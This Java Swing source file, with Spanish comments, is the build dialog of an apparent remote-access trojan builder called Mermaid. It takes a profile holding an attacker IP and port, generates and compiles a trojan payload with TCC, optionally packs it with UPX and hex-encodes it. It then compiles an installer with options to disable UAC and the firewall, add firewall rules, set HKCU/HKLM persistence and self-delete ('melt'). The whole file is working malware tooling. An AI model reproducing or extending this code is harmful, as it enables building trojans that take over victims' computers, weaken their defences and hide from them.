package tk.jlxip.mermaid;

import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

public class Build extends javax.swing.JDialog {
    Profile PROFILE;
    Boolean debug;
    
    public Build(java.awt.Frame parent, boolean modal, Profile recvProfile, Boolean recvDebug) {
        super(parent, modal);
        PROFILE = recvProfile;  // Establecemos la variable global PROFILE con el perfil recibido para que lo puedan usar otros métodos
        debug = recvDebug;  // Establecemos la variable debug
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Build.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        initComponents();
        this.setLocationRelativeTo(null);       // Centramos la ventana
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        buttonGroup1 = new javax.swing.ButtonGroup();
        buttonGroup2 = new javax.swing.ButtonGroup();
        buttonGroup3 = new javax.swing.ButtonGroup();
        jLabel1 = new javax.swing.JLabel();
        output = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        upx = new javax.swing.JCheckBox();
        jLabel3 = new javax.swing.JLabel();
        estimatedsize = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        setTitle("Build");
        setResizable(false);

        jLabel1.setText("Output:");

        output.setFocusable(false);

        jButton1.setText("BUILD");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText("...");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        upx.setText("UPX");
        upx.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                upxActionPerformed(evt);
            }
        });

        jLabel3.setText("Estimated size of the executable:");

        estimatedsize.setText("~8kb");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jLabel1)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(output, javax.swing.GroupLayout.PREFERRED_SIZE, 316, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton2)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(upx)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel3)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(estimatedsize)
                        .addGap(44, 44, 44)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(output, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton2))
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 2, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(upx))
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(jLabel3)
                        .addComponent(estimatedsize)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jButton1)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        String IP = PROFILE.IP;                             // Cargamos los datos del perfil
        String PORT = PROFILE.PORT;                         // "
        String PATH = PROFILE.PATH;                         // "
        String FILENAME = PROFILE.FILE;                     // "
        String ADFOLDER = PROFILE.ADFOLDER;                 // "
        String HKCU = PROFILE.HKCU;                         // "
        String HKLM = PROFILE.HKLM;                         // "
        String DISABLEUAC = PROFILE.DISABLEUAC;             // "
        String DISABLEFIREWALL = PROFILE.DISABLEFIREWALL;   // "
        String ADDFIREWALL = PROFILE.ADDFIREWALL;           // "
        String MELT = PROFILE.MELT;                         // "
        
        // PRIMER PASO: CREAR EL PAYLOAD
        File choosed = new File(output.getText());  // Hacemos un nuevo archivo con la ruta especificada
        String choosedPath = choosed.getAbsolutePath();     // Sacamos la ruta en un String
        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(System.getProperty("file.separator")));  // Hacemos un nuevo patrón para separar Strings con el separador del sistema operativo: \ en Windows y / en Linux y MAC OS X
        String[] slatches = raw_slatch_pattern.split(choosedPath);      // Separamos la variable con la ruta en un array de Strings

        String choosedFolderPath = "";      // Variable para almacenar la carpeta donde se creará el payload
        for(int i=0;i<slatches.length-1;i++){   // Por cada separador... (menos el último)
            choosedFolderPath = choosedFolderPath + slatches[i] + System.getProperty("file.separator"); // Añadimos a choosedFolderPath, el separador actual y el separador del sistema
        }
        
        File trojan = new File(choosedFolderPath + "temp.c");   // En la carpeta de antes, abrimos (creamos) el archivo "temp.c"
        
        GenerateTrojan generateTrojan = new GenerateTrojan(trojan, IP, PORT);   // Llamamos a GenerateTrojan con el archivo "temp.c", la IP y el puerto como argumentos
        
        COMPILAR(trojan.getAbsolutePath()); // Compilamos el código generado
        trojan.delete();            // Eliminamos el archivo "temp.c"
        
        File tempEXE = new File(choosedFolderPath + "temp.exe");    // En la carpeta de antes, abrimos (creamos) el archivo "temp.exe"
        
        if(upx.isSelected()){       // Si se ha seleccionado UPX
            UPX(tempEXE.getAbsolutePath());     // Pasar ejecutable temporal por UPX
        }
        
        // SEGUNDO PASO: CONVERTIR ARCHIVO COMPILADO A HEXADECIMAL
        GenerateHexTrojan generateHexTrojan = new GenerateHexTrojan();      // Creamos una nueva instancia de GenerateHexTrojan
        String HEXEDFILE = generateHexTrojan.GenerateHexTrojan(tempEXE);    // Almacenamos en un String la llamada a GenerateHexTrojan con el ejecutable temporal como argumento
        
        tempEXE.delete();           // Eliminamos el archivo "temp.exe"
        
        // TERCER PASO: CREAR EL INSTALADOR
        GenerateInstaller generateInstaller = new GenerateInstaller();      // Creamos una nueva instancia de GenerateInstaller
        generateInstaller.GenerateInstaller(choosed, PATH, FILENAME, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, PORT, MELT, HEXEDFILE);    // Llamamos a GenerateInstaller

        String CFILE = generateInstaller.GetCFILE();        // Guardamos en un String la ruta del código fuente del instalador
        COMPILAR(CFILE);        // Lo compilamos
        File FileCFILE = new File(CFILE);       // Lo abrimos en un archivo

        if(!debug){ // Si NO estamos en modo debug...
            FileCFILE.delete();                     // Lo eliminamos
        }

        if(upx.isSelected()){       // Si UPX está seleccionado
            UPX(choosed.getAbsolutePath());     // Pasar el instalador por UPX
        }
        
        JOptionPane.showMessageDialog(this, "The payload has been generated.");     // Creamos un mensaje de texto que aclara que el payload ha sido generado
        dispose();
    }//GEN-LAST:event_jButton1ActionPerformed

    private void COMPILAR(String file){     // FUNCIÓN PARA COMPILAR CÓDIGO C
        String tcc = "tcc/tcc.exe";     // Creamos un String donde se almacenará la línea de comandos a ejecutar, con el ejecutable de TCC,
        tcc = tcc + " \""+file+"\"";    // el archivo recibido como parámetro (importante: entre comillas, porque puede fallar si tiene espacios),
        tcc = tcc + " ws2_32.def";      // añadimos el archivo "ws2_32.def" al compilador,
        tcc = tcc + " -luser32";        // añadimos la librería "user32",
        tcc = tcc + " -lkernel32";      // añadimos la librería "kernel32"

        if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){     // Si el sistema operativo es Linux o MAC OS X
            try{
                String command = "wine "+tcc;   // Añadimos "wine" al principio de la línea de comandos, para ejecutarlo con wine, obvio ¬.¬
                Process p = Runtime.getRuntime().exec(command); // Ejecutamos el comando
                p.waitFor();    // Y esperamos a que acabe (muy importante)
            } catch (IOException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        } else {
            try{
                Process p = Runtime.getRuntime().exec(tcc); // Ejecutamos el comando
                p.waitFor();    // Y esperamos a que acabe (muy importante)
            } catch (IOException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    private void UPX(String file){      // FUNCIÓN PARA PASAR POR UPX EL ARCHIVO
        String UPXcommand = "upx/upx.exe \""+file+"\"";     // Creamos la línea de comandos para pasar el archivo del argumento por UPX (también entre comillas)
        
        if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){     // Si es Linux o MAC OS X...
            try{
                String command = "wine "+UPXcommand;    // Añadimos "wine" al principio de la línea de comandos
                Process p = Runtime.getRuntime().exec(command);     // Ejecutamos
                p.waitFor();        // Y esperamos a que termine (muy importante)
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(this, "Couldn't locate UPX. Disabling...");
                upx.setSelected(false); // No se pudo encontrar UPX, se deshabilita porque no es crucial
            } catch (InterruptedException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        } else {
            try{
                Process p = Runtime.getRuntime().exec(UPXcommand); // Ejecutamos
                p.waitFor();        // Y esperamos a que termine (muy importante);
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(this, "Couldn't locate UPX. Disabling...");
                upx.setSelected(false); // No se pudo encontrar UPX, se deshabilita porque no es crucial
            } catch (InterruptedException ex) {
                Logger.getLogger(Build.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        // PEDIR RUTA PARA ALMACENAR EL PAYLOAD
        JFileChooser fileChooser = new JFileChooser();  // Creamos un nuevo selector de archivos
        fileChooser.setMultiSelectionEnabled(false);    // Deshabilitamos la multiselección
        String path = "";   // Creamos un String
        try{
            path = new File(".").getCanonicalPath();    // y en él guardamos la ruta actual (la del archivo Mermaid.jar)
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        File file = new File(path);     // Abrimos en un File la ruta
        fileChooser.setCurrentDirectory(file);  // Y establemos al selector de archivos la ruta inicial como la actual
        fileChooser.showSaveDialog(this);   // Abrimos la ventana para GUARDAR
        
        Pattern raw_dot_pattern = Pattern.compile(Pattern.quote("."));  // Creamos un patrón para dividir Strings mediante el punto
        String output_dots[] = raw_dot_pattern.split(fileChooser.getSelectedFile().getAbsolutePath());  // Dividimos el archivo seleccionado en un array de Strings
        if(output_dots[output_dots.length-1].equals("exe")){    // Si el archivo seleccionado NO tiene la terminación ".exe"...
            output.setText(fileChooser.getSelectedFile().getAbsolutePath());    // Se la añadimos
        } else {    // Si sí la tiene...
            output.setText(fileChooser.getSelectedFile().getAbsolutePath()+".exe"); // Lo dejamos como está
        }
    }//GEN-LAST:event_jButton2ActionPerformed

    private void upxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_upxActionPerformed
        if(upx.isSelected()){   // Si el JCheckBox de UPX está seleccionado
            estimatedsize.setText("~5kb");  // Ponemos que el peso final será de alrededor de 5kb
        } else {    // De otro modo...
            estimatedsize.setText("~8kb");  // Ponemos que el peso final será de alrededor de 8kb
        }
    }//GEN-LAST:event_upxActionPerformed
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.ButtonGroup buttonGroup1;
    private javax.swing.ButtonGroup buttonGroup2;
    private javax.swing.ButtonGroup buttonGroup3;
    private javax.swing.JLabel estimatedsize;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JTextField output;
    private javax.swing.JCheckBox upx;
    // End of variables declaration//GEN-END:variables
}
